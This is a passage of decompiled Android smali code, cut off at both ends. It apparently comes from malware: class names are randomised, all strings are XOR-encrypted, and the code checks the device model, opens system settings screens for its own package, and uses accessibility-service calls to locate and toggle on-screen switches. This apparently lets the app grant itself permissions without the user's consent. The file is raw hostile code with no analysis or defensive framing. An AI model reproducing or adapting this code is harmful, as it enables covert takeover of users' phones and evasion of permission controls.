    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h1(Landroid/accessibilityservice/AccessibilityService;)V

    return-void
.end method

.method private static q1()V
    .locals 8

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->e:Z

    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const/4 v2, 0x3

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    const/high16 v4, 0x10000000

    const/16 v5, 0xb

    const/16 v6, 0x1a

    if-eqz v2, :cond_0

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v7, v3, [B

    fill-array-data v7, :array_3

    invoke-static {v2, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    :cond_0
    const/16 v2, 0x9

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v7, v3, [B

    fill-array-data v7, :array_5

    invoke-static {v2, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_2

    :cond_1
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1}, Landroid/content/Intent;-><init>()V

    new-array v2, v6, [B

    fill-array-data v2, :array_6

    new-array v6, v3, [B

    fill-array-data v6, :array_7

    invoke-static {v2, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/16 v6, 0x36

    new-array v6, v6, [B

    fill-array-data v6, :array_8

    new-array v7, v3, [B

    fill-array-data v7, :array_9

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v2, v6}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    new-array v2, v5, [B

    fill-array-data v2, :array_a

    new-array v5, v3, [B

    fill-array-data v5, :array_b

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v5}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v2, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_c

    new-array v5, v3, [B

    fill-array-data v5, :array_d

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v0, v0, [B

    const/4 v5, 0x0

    const/16 v6, 0x60

    aput-byte v6, v0, v5

    new-array v3, v3, [B

    fill-array-data v3, :array_e

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_2
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    new-array v1, v6, [B

    fill-array-data v1, :array_f

    new-array v2, v3, [B

    fill-array-data v2, :array_10

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x40

    new-array v2, v2, [B

    fill-array-data v2, :array_11

    new-array v6, v3, [B

    fill-array-data v6, :array_12

    invoke-static {v2, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 v1, 0x29

    new-array v1, v1, [B

    fill-array-data v1, :array_13

    new-array v2, v3, [B

    fill-array-data v2, :array_14

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    new-array v1, v5, [B

    fill-array-data v1, :array_15

    new-array v2, v3, [B

    fill-array-data v2, :array_16

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :goto_0
    return-void

    :array_0
    .array-data 1
        -0x4et
        0x56t
        -0x19t
    .end array-data

    :array_1
    .array-data 1
        -0x15t
        0x6et
        -0x2et
        -0x1dt
        -0x19t
        -0x6et
        -0x55t
        -0x5at
    .end array-data

    :array_2
    .array-data 1
        0x6dt
        0x50t
        -0x14t
        -0x50t
    .end array-data

    :array_3
    .array-data 1
        0x34t
        0x68t
        -0x27t
        -0xft
        0x3et
        0x7at
        0x74t
        -0x3ft
    .end array-data

    :array_4
    .array-data 1
        0x27t
        -0x18t
        0x4t
        -0x5ct
        0x34t
        0xft
        0x43t
        -0x4ct
        0x1dt
    .end array-data

    nop

    :array_5
    .array-data 1
        0x51t
        -0x7ft
        0x72t
        -0x35t
        0x14t
        0x56t
        0x76t
        -0x79t
    .end array-data

    :array_6
    .array-data 1
        0x27t
        0x9t
        0x4et
        -0x70t
        0x20t
        0x13t
        -0x22t
        0x7at
        0x6at
        0x16t
        0x46t
        -0x34t
        0x3bt
        0x13t
        -0x25t
        0x66t
        0x2dt
        0x9t
        0x4dt
        -0x2dt
        0x37t
        0x14t
        -0x37t
        0x72t
        0x21t
        0x14t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x44t
        0x66t
        0x23t
        -0x42t
        0x56t
        0x7at
        -0x58t
        0x15t
    .end array-data

    :array_8
    .array-data 1
        0x32t
        0x8t
        -0x6t
        -0x13t
        -0x45t
        -0x6ft
        0x4dt
        0x34t
        0x7ft
        0x17t
        -0xet
        -0x4ft
        -0x60t
        -0x6ft
        0x48t
        0x28t
        0x38t
        0x8t
        -0x7t
        -0x52t
        -0x54t
        -0x6at
        0x5at
        0x3ct
        0x34t
        0x15t
        -0x47t
        -0x5et
        -0x52t
        -0x74t
        0x52t
        0x2dt
        0x38t
        0x13t
        -0x12t
        -0x13t
        -0x63t
        -0x73t
        0x49t
        0x2dt
        0x38t
        0x2t
        -0x20t
        -0x69t
        -0x54t
        -0x66t
        0x7at
        0x38t
        0x25t
        0xet
        -0x1ft
        -0x56t
        -0x47t
        -0x7ft
    .end array-data

    nop

    :array_9
    .array-data 1
        0x51t
        0x67t
        -0x69t
        -0x3dt
        -0x33t
        -0x8t
        0x3bt
        0x5bt
    .end array-data

    :array_a
    .array-data 1
        -0x38t
        -0x64t
        0x1bt
        -0x65t
        0x53t
        -0x29t
        -0x11t
        0x1t
        -0x27t
        -0x70t
        0x1dt
    .end array-data

    :array_b
    .array-data 1
        -0x48t
        -0x3t
        0x78t
        -0x10t
        0x32t
        -0x50t
        -0x76t
        0x6ft
    .end array-data

    :array_c
    .array-data 1
        0x40t
        0x2ft
        0x7bt
        0x64t
        0x59t
    .end array-data

    nop

    :array_d
    .array-data 1
        0x34t
        0x4et
        0x19t
        0x2dt
        0x3dt
        -0x3at
        -0x78t
        -0x3dt
    .end array-data

    :array_e
    .array-data 1
        0x51t
        0x5et
        0x58t
        -0x10t
        0x16t
        0x2ft
        0x1ft
        0xct
    .end array-data

    :array_f
    .array-data 1
        0x2et
        -0x75t
        0x4ct
        0x73t
        -0x14t
        -0x5ft
        0x4at
        0x61t
        0x63t
        -0x6ct
        0x44t
        0x2ft
        -0x9t
        -0x5ft
        0x4ft
        0x7dt
        0x24t
        -0x75t
        0x4ft
        0x30t
        -0x5t
        -0x5at
        0x5dt
        0x69t
        0x28t
        -0x6at
    .end array-data

    nop

    :array_10
    .array-data 1
        0x4dt
        -0x1ct
        0x21t
        0x5dt
        -0x66t
        -0x38t
        0x3ct
        0xet
    .end array-data

    :array_11
    .array-data 1
        0x50t
        0x14t
        -0x7at
        0x6dt
        -0x1ft
        0xdt
        0x53t
        0x2t
        0x1dt
        0xbt
        -0x72t
        0x31t
        -0x6t
        0xdt
        0x56t
        0x1et
        0x5at
        0x14t
        -0x7bt
        0x2et
        -0xat
        0xat
        0x44t
        0xat
        0x56t
        0x9t
        -0x3bt
        0x22t
        -0xct
        0x10t
        0x4ct
        0x1bt
        0x5at
        0xft
        -0x6et
        0x6dt
        -0x3ct
        0xbt
        0x43t
        0x19t
        0x63t
        0x1et
        -0x67t
        0x2et
        -0x2t
        0x17t
        0x56t
        0x4t
        0x5ct
        0x15t
        -0x51t
        0x26t
        -0x1dt
        0x5t
        0x4ct
        0x1t
        0x72t
        0x18t
        -0x61t
        0x2at
        -0x1ft
        0xdt
        0x51t
        0x14t
    .end array-data

    :array_12
    .array-data 1
        0x33t
        0x7bt
        -0x15t
        0x43t
        -0x69t
        0x64t
        0x25t
        0x6dt
    .end array-data

    :array_13
    .array-data 1
        -0x10t
        0x5ft
        0x46t
        -0x39t
        -0x32t
        0x68t
        0x3et
        -0x11t
        -0x13t
        0x4et
        0x40t
        -0x24t
        -0x38t
        0x23t
        0x71t
        -0x1bt
        -0x9t
        0x53t
        0x4at
        -0x24t
        -0x6et
        0x7et
        0x7ft
        -0x20t
        -0x9t
        0x6at
        0x40t
        -0x40t
        -0x2ft
        0x64t
        0x63t
        -0xbt
        -0x16t
        0x55t
        0x4bt
        -0xat
        -0x27t
        0x79t
        0x71t
        -0x11t
        -0x11t
    .end array-data

    nop

    :array_14
    .array-data 1
        -0x7dt
        0x3at
        0x25t
        -0x4et
        -0x44t
        0xdt
        0x10t
        -0x7at
    .end array-data

    :array_15
    .array-data 1
        0x5dt
        -0xbt
        0x18t
        0x3et
        -0x20t
        -0x6ct
        0x45t
        0x34t
        0x4ct
        -0x7t
        0x1et
    .end array-data

    :array_16
    .array-data 1
        0x2dt
        -0x6ct
        0x7bt
        0x55t
        -0x7ft
        -0xdt
        0x20t
        0x5at
    .end array-data
.end method

.method private static synthetic q2(Landroid/content/Context;)V
    .locals 4

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/vknnolqo/p9sv5zvf/FtJVk3Ba;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/kz;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/kz;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0xc80

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static synthetic r()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->E2()V

    return-void
.end method

.method static synthetic r0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->k1()V

    return-void
.end method

.method private static r1()V
    .locals 4

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f:Z

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/16 v1, 0x14

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x2f

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    :array_0
    .array-data 1
        0x40t
        0x58t
        -0x6ft
        0x2et
        0x54t
        0x2ft
        0x41t
        0x1bt
        0xdt
        0x47t
        -0x6dt
        0x77t
        0x58t
        0x2ct
        0x5dt
        0x15t
        0x55t
        0x5et
        -0x6et
        0x67t
    .end array-data

    :array_1
    .array-data 1
        0x23t
        0x37t
        -0x4t
        0x0t
        0x3dt
        0x5et
        0x2et
        0x74t
    .end array-data

    :array_2
    .array-data 1
        -0x5t
        0x63t
        -0x13t
        0x25t
        0x2et
        0x3dt
        -0x59t
        0x1ct
        -0x4at
        0x7ct
        -0x11t
        0x7ct
        0x22t
        0x3et
        -0x45t
        0x12t
        -0x12t
        0x65t
        -0x12t
        0x6ct
        0x69t
        0x1ct
        -0x59t
        0x4t
        -0x3t
        0x7et
        -0x2dt
        0x6at
        0x31t
        0x25t
        -0x5at
        0x14t
        -0x2bt
        0x6dt
        -0x12t
        0x6at
        0x20t
        0x29t
        -0x46t
        0x32t
        -0x5t
        0x78t
        -0x17t
        0x7dt
        0x2et
        0x38t
        -0x4ft
    .end array-data

    :array_3
    .array-data 1
        -0x68t
        0xct
        -0x80t
        0xbt
        0x47t
        0x4ct
        -0x38t
        0x73t
    .end array-data
.end method

.method private static synthetic r2(Landroid/content/Context;)V
    .locals 5

    .line 1
    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    new-instance v0, Landroid/content/Intent;

    const/16 v2, 0x35

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    new-array v4, v1, [B

    fill-array-data v4, :array_4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-static {v4, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/dz;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/dz;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x320

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    nop

    :array_0
    .array-data 1
        0x78t
        0x6ft
        0x70t
        -0x33t
        -0x66t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x8t
        0xat
        0x2t
        -0x55t
        -0x7t
        -0x6et
        -0x13t
        -0x46t
    .end array-data

    :array_2
    .array-data 1
        -0x77t
        0x40t
        -0x58t
        -0x6t
        0x1ft
        -0x14t
        -0x4ct
        0x34t
        -0x65t
        0x4bt
        -0x48t
        -0x4t
        0x19t
        -0x15t
        -0x49t
        0x69t
        -0x3at
        0x7ct
        -0x77t
        -0x27t
        0x25t
        -0x40t
        -0x7dt
        0x4et
        -0x49t
        0x67t
        -0x75t
        -0x3at
        0x3ft
        -0x29t
        -0x6bt
        0x45t
        -0x56t
        0x6ft
        -0x68t
        -0x24t
        0x35t
        -0x29t
        -0x77t
        0x45t
        -0x59t
        0x7et
        -0x68t
        -0x3ft
        0x3dt
        -0x34t
        -0x76t
        0x5bt
        -0x44t
        0x67t
        -0x7dt
        -0x3at
        0x23t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x18t
        0x2et
        -0x34t
        -0x78t
        0x70t
        -0x7bt
        -0x30t
        0x1at
    .end array-data

    :array_4
    .array-data 1
        -0x1bt
        0x7at
        -0x72t
        0x5bt
        -0x6bt
        0x57t
        -0x69t
        -0x42t
    .end array-data

    :array_5
    .array-data 1
        -0x6bt
        0x1bt
        -0x13t
        0x30t
        -0xct
        0x30t
        -0xet
        -0x7ct
    .end array-data
.end method

.method public static synthetic s()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->v2()V

    return-void
.end method

.method static synthetic s0(ILjava/util/List;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v9;)V
    .locals 0

    .line 1
    invoke-static {p0, p1, p2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->M0(ILjava/util/List;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v9;)V

    return-void
.end method

.method private static s1(I)V
    .locals 4

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x8

    if-eqz v0, :cond_2

    const/16 p0, 0x3e8

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    const/16 v2, 0x1a

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result p0

    const/4 v1, 0x1

    if-eqz p0, :cond_0

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h:Z

    new-instance p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$t;

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$t;-><init>()V

    invoke-static {v0, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto/16 :goto_1

    :cond_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/4 v2, 0x2

    if-le v0, v2, :cond_5

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_4

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h:Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->k1()V

    goto :goto_1

    :cond_1
    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$u;

    invoke-direct {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$u;-><init>()V

    invoke-static {p0, v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto :goto_1

    :cond_2
    if-lez p0, :cond_5

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v2, 0x19

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v2, 0x12c

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v3

    if-eqz v3, :cond_3

    :goto_0
